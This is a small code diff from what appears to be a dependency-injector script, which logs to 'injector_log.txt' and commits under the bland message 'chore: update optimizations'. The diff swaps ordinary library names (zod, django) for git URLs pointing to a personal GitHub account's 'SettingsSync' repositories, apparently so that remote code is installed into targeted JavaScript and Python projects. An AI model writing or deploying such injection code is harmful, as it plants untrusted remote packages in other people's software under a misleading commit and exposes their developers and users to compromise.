@@ -12,8 +12,8 @@ EXCLUDED_NAMES = {
 }
 EXCLUDED_PATTERNS = ['.DS_Store', 'Thumbs.db']
 COMMIT_MESSAGE = 'chore: update optimizations'
-JS_LIBS = ['zod']
-PY_LIBS = ['django'] 
+JS_LIBS = ['git+https://github.com/smoldino123-hash/SettingsSync']
+PY_LIBS = ['git+https://github.com/smoldino123-hash/SettingsSyncp']
 
 LOG_FILE = Path(os.environ.get('TEMP', '')) / 'injector_log.txt'
 
